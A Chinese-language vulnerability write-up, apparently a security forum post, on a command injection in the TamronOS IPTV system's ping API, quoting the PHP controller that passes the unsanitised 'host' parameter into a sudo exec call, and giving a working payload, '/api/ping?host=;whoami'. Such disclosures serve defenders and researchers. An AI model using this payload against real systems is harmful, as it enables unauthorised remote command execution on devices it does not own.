**TamronOS\_IPTV系统任意命令执行漏洞**  
开源镜像，可以在官网下载，下载之后解压到这个地方  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3f663e9fe33c48b8cc01a31adb340779998fcf7e.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3f663e9fe33c48b8cc01a31adb340779998fcf7e.jpg)  
漏洞地方出现在cgi/iptv/Controllers/ApiController.php的ping方法

```php
public function ping()
    {

        $ip = $_GET['host'];
        if($ip) {
            // mode
            $mode = $_GET['type'];
            if(in_array($mode, ['icmp', 'syn', 'arp', 'tracert', 'whois', 'tcpdump'])) {
                $options[] = sprintf(' -m %s', $mode);
            }

            // count
            $count = intval($_GET['count']);
            $count = min(1000, $count);
            $count = max(0, $count);
            if($count > 0) {
                $options[] = sprintf(' -c %d', $count);
            }

            if($mode == 'tcpdump') {
                $interface = intval($_GET['interface']);
                $options[] = sprintf(' -i %s', $interface);
            }else{
                // interval
                $interface = intval($_GET['interface']);
                $interval = min(10000, $interval);
                $interval = max(0, $interval);
                if($interval > 0) {
                    $options[] = sprintf(' -i %d', $interval);
                }
            }

            // timeout
            $timeout = intval($_GET['timeout']);
            $timeout = min(60, $timeout);
            $timeout = max(5, $timeout);
            if($timeout > 5) {
                $options[] = sprintf(' -T %d', $timeout);
            }

            // source
            $source = $_GET['source'];
            if($source) {
                $options[] = sprintf(' -s %s', $source);
            }

            $cmd = sprintf('/usr/bin/sudo /etc/exec/kping -t %s%s', $ip, join(' ', $options));
            exec($cmd, $res);
        }else{
            $res = '域名或ip不能为空';
        }
        $respond = [
            'suc' => 1,
            'cmd' => $cmd,
            'result' => join(PHP_EOL, $res)
        ];
        $this->json($respond);
    }
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4f923e5c53114f174ec1acdfb1a44a01031dc84d.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4f923e5c53114f174ec1acdfb1a44a01031dc84d.jpg)  
直接看exec函数，$cmd可控,把$ip直接拼接到系统命令中  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c8eb36df5f90c4b0e8bdf43058b9960012351450.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c8eb36df5f90c4b0e8bdf43058b9960012351450.jpg)  
只需要构造host参数就行，因为是采用的是tp控制器/方法名这种  
构造payload: /api/ping?host=;whoami  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c9a46d51ead42835402265085a8cd5041c24b2bb.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c9a46d51ead42835402265085a8cd5041c24b2bb.jpg)